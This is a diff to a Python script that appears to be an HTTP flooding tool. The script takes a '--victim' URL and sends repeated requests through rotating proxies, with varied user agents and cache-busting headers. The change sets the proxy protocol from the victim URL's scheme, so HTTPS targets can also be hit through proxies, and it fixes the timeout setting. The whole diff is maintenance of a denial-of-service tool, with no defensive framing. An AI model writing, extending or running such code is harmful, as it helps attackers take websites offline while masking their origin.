@@ -6,7 +6,7 @@ from requests.auth import HTTPBasicAuth
 from urllib.parse import urlparse
 
 #versioning
-VERSION = (0, 1, 2)
+VERSION = (0, 1, 3)
 __version__ = '%d.%d.%d' % VERSION[0:3]
 
 #if python ver < 3.5
@@ -27,6 +27,7 @@ ref = []
 keyword = []
 ua = []
 timeout = 10
+proto = ''
 
 # arguments
 url = ''
@@ -51,6 +52,10 @@ def main(argv):
 			if len(arg) >= 1:
 				global url
 				url = arg
+				# defining protocol
+				global proto
+				link = urlparse(url)
+				proto = link.scheme
 			else:
 				print('Parameter [--victim] must be a string and not to be empty!')
 				sys.exit(2)
@@ -64,6 +69,7 @@ def main(argv):
 		elif opt in ('-t', '-timeout'):
 			arg = int(arg)
 			if isinstance(arg, int) and arg >= 1:
+				global timeout
 				timeout = arg
 			else:
 				print('Parameter [--timeout] must be an integer and not to be less than 1')
@@ -134,7 +140,7 @@ def request(index):
 			'Accept-Encoding': 'gzip;q=0,deflate;q=0' if only_gzip < 5 else 'identity, deflate, compress, gzip, sdch, br',
 			'Cache-Control': 'no-cache, no-store, must-revalidate',
 			'Pragma': 'no-cache'}
-		proxy = {'http': ips[index]}
+		proxy = {proto: ips[index]}
 		try:
 			if auth:
 				r = requests.get(url, params=payload, headers=headers, proxies=proxy, timeout=timeout, auth=HTTPBasicAuth(auth_login, auth_pass))
